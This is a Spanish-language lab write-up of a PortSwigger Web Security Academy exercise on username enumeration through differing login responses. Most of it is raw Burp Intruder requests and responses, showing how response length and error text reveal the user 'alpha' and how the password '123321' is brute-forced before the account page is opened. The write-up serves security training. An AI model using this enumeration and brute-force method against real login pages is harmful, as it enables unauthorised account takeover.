# 🔐 Laboratorio: Vulnerabilidad de autenticación - Enum. de nombres de usuario por diferente respuestas

### Vulnerabilidades de autenticación

Conceptualmente, las vulnerabilidades de autenticación son fáciles de entender. Sin embargo, suelen ser fundamentales debido a la clara relación entre autenticación y seguridad.

Las vulnerabilidades de autenticación pueden permitir a los atacantes obtener acceso a datos y funciones confidenciales. También exponen una superficie de ataque adicional para futuras vulnerabilidades. Por este motivo, es importante aprender cómo identificar y explotar las vulnerabilidades de autenticación y cómo eludir las medidas de protección comunes.

En esta sección te explicamos:

* Los mecanismos de autenticación más comunes utilizados por los sitios web.
* Posibles vulnerabilidades en estos mecanismos.
* Vulnerabilidades inherentes en diferentes mecanismos de autenticación.
* Vulnerabilidades típicas que se introducen por su implementación incorrecta.
* Cómo puede hacer que sus propios mecanismos de autenticación sean lo más sólidos posible.

### ¿Cuál es la diferencia entre autenticación y autorización?

La autenticación es el proceso de verificar que un usuario es quien dice ser. La autorización implica verificar si un usuario tiene permiso para hacer algo.

Por ejemplo, la autenticación determina si alguien que intenta acceder a un sitio web con el nombre de usuario `Carlos123`es realmente la misma persona que creó la cuenta.

Una vez `Carlos123`autenticado, sus permisos determinan qué está autorizado a hacer. Por ejemplo, pueden estar autorizados a acceder a información personal sobre otros usuarios o realizar acciones como eliminar la cuenta de otro usuario.

### Ataques de fuerza bruta

Un ataque de fuerza bruta se produce cuando un atacante utiliza un sistema de prueba y error para adivinar las credenciales de usuario válidas. Estos ataques suelen automatizarse mediante listas de palabras de nombres de usuario y contraseñas. Automatizar este proceso, especialmente utilizando herramientas dedicadas, potencialmente permite a un atacante realizar una gran cantidad de intentos de inicio de sesión a alta velocidad.

La fuerza bruta no siempre consiste simplemente en hacer conjeturas completamente aleatorias sobre nombres de usuarios y contraseñas. Al utilizar también lógica básica o conocimiento disponible públicamente, los atacantes pueden ajustar los ataques de fuerza bruta para hacer conjeturas mucho más fundamentadas. Esto aumenta considerablemente la eficacia de este tipo de ataques. Los sitios web que dependen del inicio de sesión basado en contraseña como único método para autenticar a los usuarios pueden ser muy vulnerables si no implementan suficiente protección de fuerza bruta.

### Nombres de usuario de fuerza bruta

Los nombres de usuario son especialmente fáciles de adivinar si siguen un patrón reconocible, como una dirección de correo electrónico. Por ejemplo, es muy común ver inicios de sesión comerciales en formato `firstname.lastname@somecompany.com`. Sin embargo, incluso si no existe un patrón obvio, a veces incluso cuentas con altos privilegios se crean utilizando nombres de usuario predecibles, como `admin`o `administrator`.

Durante la auditoría, verifique si el sitio web revela públicamente posibles nombres de usuario. Por ejemplo, ¿puedes acceder a los perfiles de usuario sin iniciar sesión? Incluso si el contenido real de los perfiles está oculto, el nombre utilizado en el perfil a veces es el mismo que el nombre de usuario de inicio de sesión. También debe verificar las respuestas HTTP para ver si se divulga alguna dirección de correo electrónico. En ocasiones, las respuestas contienen direcciones de correo electrónico de usuarios con muchos privilegios, como administradores o soporte de TI.

### Contraseñas de fuerza bruta

De manera similar, las contraseñas pueden ser de fuerza bruta, y la dificultad varía según la seguridad de la contraseña. Muchos sitios web adoptan algún tipo de política de contraseñas, lo que obliga a los usuarios a crear contraseñas de alta entropía que son, al menos en teoría, más difíciles de descifrar utilizando únicamente la fuerza bruta. Por lo general, esto implica hacer cumplir las contraseñas con:

* Un número mínimo de caracteres.
* Una mezcla de letras minúsculas y mayúsculas.
* Al menos un carácter especial

Sin embargo, si bien las contraseñas de alta entropía son difíciles de descifrar solo para las computadoras, podemos utilizar un conocimiento básico del comportamiento humano para explotar las vulnerabilidades que los usuarios introducen involuntariamente en este sistema. En lugar de crear una contraseña segura con una combinación aleatoria de caracteres, los usuarios a menudo toman una contraseña que pueden recordar e intentan manipularla para que se ajuste a la política de contraseñas. Por ejemplo, si `mypassword`no está permitido, los usuarios pueden probar algo como `Mypassword1!`o `Myp4$$w0rd`en su lugar.

En los casos en que la política requiere que los usuarios cambien sus contraseñas periódicamente, también es común que los usuarios simplemente realicen cambios menores y predecibles en su contraseña preferida. Por ejemplo, `Mypassword1!`se convierte `Mypassword1?`o`Mypassword2!.`

Este conocimiento de las credenciales probables y los patrones predecibles significa que los ataques de fuerza bruta a menudo pueden ser mucho más sofisticados y, por lo tanto, efectivos, que simplemente iterar a través de cada combinación posible de personajes.

### Enumeración de nombre de usuario

La enumeración de nombres de usuario ocurre cuando un atacante puede observar cambios en el comportamiento del sitio web para identificar si un nombre de usuario determinado es válido.

La enumeración de nombres de usuario normalmente ocurre en la página de inicio de sesión, por ejemplo, cuando ingresa un nombre de usuario válido pero una contraseña incorrecta, o en los formularios de registro cuando ingresa un nombre de usuario que ya está en uso. Esto reduce en gran medida el tiempo y el esfuerzo necesarios para forzar un inicio de sesión porque el atacante puede generar rápidamente una lista corta de nombres de usuario válidos.

Al intentar forzar una página de inicio de sesión por fuerza bruta, debes prestar especial atención a las diferencias en:

* **Códigos de estado** : durante un ataque de fuerza bruta, es probable que el código de estado HTTP devuelto sea el mismo para la gran mayoría de las conjeturas porque la mayoría de ellas serán incorrectas. Si una suposición devuelve un código de estado diferente, esto es una fuerte indicación de que el nombre de usuario era correcto. Es una buena práctica que los sitios web devuelvan siempre el mismo código de estado independientemente del resultado, pero esta práctica no siempre se sigue.
* **Mensajes de error** : a veces el mensaje de error devuelto es diferente dependiendo de si tanto el nombre de usuario como la contraseña son incorrectos o solo la contraseña era incorrecta. Es una buena práctica que los sitios web utilicen mensajes genéricos idénticos en ambos casos, pero a veces se producen pequeños errores tipográficos. Un solo carácter fuera de lugar hace que los dos mensajes sean distintos, incluso en los casos en que el carácter no es visible en la página representada.
* **Tiempos de respuesta** : si la mayoría de las solicitudes se manejaron con un tiempo de respuesta similar, cualquiera que se desvíe de este sugiere que algo diferente estaba sucediendo detrás de escena. Esta es otra indicación de que el nombre de usuario adivinado podría ser correcto. Por ejemplo, es posible que un sitio web solo compruebe si la contraseña es correcta si el nombre de usuario es válido. Este paso adicional podría provocar un ligero aumento en el tiempo de respuesta. Esto puede ser sutil, pero un atacante puede hacer que este retraso sea más obvio ingresando una contraseña excesivamente larga que el sitio web tarda mucho más en procesar.

### Laboratorio: enumeración de nombres de usuario a través de diferentes respuestas

APRENDIZ

LABORATORIONo resuelto

Este laboratorio es vulnerable a ataques de fuerza bruta de enumeración de nombres de usuario y contraseñas. Tiene una cuenta con un nombre de usuario y contraseña predecibles, que se pueden encontrar en las siguientes listas de palabras:

* [Nombres de usuario de los candidatos](https://portswigger.net/web-security/authentication/auth-lab-usernames)
* [Contraseñas de candidatos](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Para resolver la práctica de laboratorio, enumere un nombre de usuario válido, aplique fuerza bruta a la contraseña de este usuario y luego acceda a su página de cuenta.

[\
](https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/authentication-apprentice/authentication/password-based/brute-forcing-usernames)

```python
// Some code

Laboratorio: Vulnerabilidad de autenticación - Enum. de nombres de usuario por diferente respuestas







BUSQUEDA DE DIVULGACION DE POSIBLES NOMBRES DE USUARIOS Y MAS INFORMACION:




Soph Far

Bud Weisser | 25 December 2023

Paul Amuscle | 03 January 2024

Amber Light | 04 January 2024

Jock Sonyou | 05 January 2024

Aileen Slightly | 18 January 2024

Mike Pleasure | 27 December 2023

I.C. Poorly | 02 January 2024

Bob Forapples | 29 December 2023

Paige Turner | 16 January 2024

Brian Side | 29 December 2023

Clive Started | 03 January 2024

Scott Com | 05 January 2024

Penny Whistle | 06 January 2024

Anna Nutherthing | 11 January 2024
 
Slim Jim | 30 December 2023

Bart Gallery | 10 January 2024

Ollie Ollie Ollie | 20 January 2024

Paul Totherone | 31 December 2023

Roger That | 02 January 2024

Fred Time | 03 January 2024

Greg Fomercy | 15 January 2024

April Showers | 16 January 2024

Schmidt Happens | 16 January 2024

Shay Bail | 03 January 2024

Selma Soul | 03 January 2024

Rich Man | 15 January 2024

Jay Bail | 17 January 2024

O. Lala | 19 January 2024

Kit Kat | 04 January 2024

Carl Bondioxide | 07 January 2024

Lee Onmee | 11 January 2024

Chris Mass | 05 January 2024

Mick Mouse | 07 January 2024

Andy Man | 08 January 2024

Carrie Onanon | 11 January 2024

Dean N'Mean | 16 January 2024




INTERSEPTAMOS EL LOGIN PARA DETERMINAR CON DISTINTOS FACTORES UN USUARIO VALIDO DE LA PLATAFORMA WEB:






REQUEST:





GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close





POST /login HTTP/1.1
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=xgGiuob4Y682GN1VsK8Zk4edcSG5ZXJ8
Content-Length: 55
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close

username=XXXXXXXXXXXXXXX&password=XXXXXXXXXXXXXXXXXXXXD




RESPONSE:


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3140

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Username enumeration via different responses</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Username enumeration via different responses</h2>
                            <a class=link-back href='https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>






PAUTAS IMPORTANTES A VER:


HTTP/2 200 OK

Content-Length: 3140

<p class=is-warning>Invalid username</p>






USAMOS INTRUDER SOBRE LA SOLISITUD DEL LOGIN PARA HACERLO MAS RAPIDO ; APLICANDO FUERZA BRUTA SOLO SOBRE EL USUARIO Y DE CONTRASEÑA CUALQUIER COSA POR QUE SI NO TE DICE "MISSING PARAMETROS SI FALTA ALGUNO DE LOS DOS", Y DETERMINANDO POR UN LENGH DIFERENTE Y MENSAJE EN LA RESPONSE "INCORECTO PASSWORD" VIMOS QUE EL USUARIO ES ALPHA CON UN LENGH DE 3250 a diferencia del resto 3248, TODAS TENIAN CODIGO DE ESTADO 200, LUEGO DE FINALIZAR FUERZA BRUTA CON LA LISTA DE PALABRAS USANDO SNIPER DE INTRUDER:



FUERZA BRUTA DEL POST DEL LOGIN INTRUDER SOBRE SUARIO USANDO SNIPER:



POST /login HTTP/1.1
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=xgGiuob4Y682GN1VsK8Zk4edcSG5ZXJ8
Content-Length: 55
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close

username=§USER§&password=XXXXXXXXXXXXXXXXXXXXD




REQUEST:


POST /login HTTP/2
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=xgGiuob4Y682GN1VsK8Zk4edcSG5ZXJ8
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

username=alpha&password=XXXXXXXXXXXXXXXXXXXXD



RESPONSE:


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3142

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Username enumeration via different responses</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Username enumeration via different responses</h2>
                            <a class=link-back href='https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Incorrect password</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>







YA TENIENDO L USUARIO HACEMOS FUERZA BRUITA CON SNIPER SOLO SOBRE EL PASSWD DEL USUARIO ALPHA:





FUERZA BRUTA DEL POST DEL LOGIN INTRUDER SOBRE PASSWD DEL USUARIO ALPHA USANDO SNIPER:




POST /login HTTP/1.1
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=xgGiuob4Y682GN1VsK8Zk4edcSG5ZXJ8
Content-Length: 55
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close

username=alpha&password=§PASSWD§







REQUES INCORRECTA:




rigin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

username=alpha&password=123456




RESPONSE INCORRECTA:


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3142

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Username enumeration via different responses</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Username enumeration via different responses</h2>
                            <a class=link-back href='https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Incorrect password</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>





REQUEST CORRECTA DIO LENGH de 187 a difencia de los erroneos 3240:


POST /login HTTP/2
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=xgGiuob4Y682GN1VsK8Zk4edcSG5ZXJ8
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

username=alpha&password=123321





RESPONSE CORRECTA:


HTTP/2 302 Found
Location: /my-account?id=alpha
Set-Cookie: session=loayjYCjc0gkseiI2PqipNnLKJqtLPax; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0




BINGO TENEMOS USUARIO Y PASSSWORD:  alpha:123321








NOS LOGUEAMOS REQUEST:




POST /login HTTP/2
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=xgGiuob4Y682GN1VsK8Zk4edcSG5ZXJ8
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: keep-alive

username=alpha&password=123321







GET /my-account?id=alpha HTTP/2
Host: 0ae80007045692bb80d78ae80012009a.web-security-academy.net
Cookie: session=fGUzso4uQ84NAxmHl0HutkXUeEEHsRPl
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ae80007045692bb80d78ae80012009a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9




BINGO :D
```
